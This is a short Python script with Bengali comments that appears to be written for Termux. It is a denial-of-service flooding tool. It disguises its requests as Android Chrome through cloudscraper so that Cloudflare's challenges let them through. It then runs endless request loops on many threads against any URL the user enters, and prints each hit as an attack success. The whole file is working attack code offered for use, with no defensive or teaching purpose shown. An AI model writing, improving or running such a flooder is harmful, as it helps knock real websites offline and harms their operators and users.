import cloudscraper
import threading
import time
import sys

# Cloudscraper সেটআপ (এটি ব্রাউজারের মতো আচরণ করে)
scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'android',
        'desktop': False
    }
)

def forceful_attack(url):
    while True:
        try:
            # স্ক্রিপ্ট এখন আসল ক্রোম ব্রাউজার সেজে রিকোয়েস্ট পাঠাবে
            response = scraper.get(url, timeout=5)
            
            # রেজাল্ট চেক করা
            if response.status_code == 200:
                print(f"🔥 Hit Success: {url} | Status: 200")
            elif response.status_code == 503:
                print("🛡️ Cloudflare Challenge Detected (Trying to bypass...)")
            elif response.status_code == 403:
                print("⛔ Access Denied (Target blocked IP)")
            else:
                print(f"⚠️ Status: {response.status_code}")
                
        except Exception as e:
            # কানেকশন এরর ইগনোর করবে যাতে লুপ না থামে
            pass

def main():
    print("--- 🚀 Advanced CloudScraper Bot for Termux 🚀 ---")
    url = input("Enter Target URL (e.g., https://example.com): ").strip()
    
    if not url.startswith("http"):
        print("❌ Error: Link must start with http:// or https://")
        sys.exit()

    try:
        thread_count = int(input("Enter Threads (Recommended: 50-100): "))
    except ValueError:
        print("❌ Error: Enter a valid number.")
        sys.exit()

    print(f"\n⚡ Attack started on {url} with {thread_count} threads...")
    print("Press CTRL + C to stop.\n")

    # একসাথে অনেকগুলো থ্রেড চালু করা
    for i in range(thread_count):
        t = threading.Thread(target=forceful_attack, args=(url,))
        t.daemon = True
        t.start()
        # সব থ্রেড একসাথে চালু না করে একটু গ্যাপ দেওয়া (IP Block এড়াতে)
        time.sleep(0.01)

    # মেইন লুপ ধরে রাখা
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopped by user.")

if __name__ == "__main__":
    main()
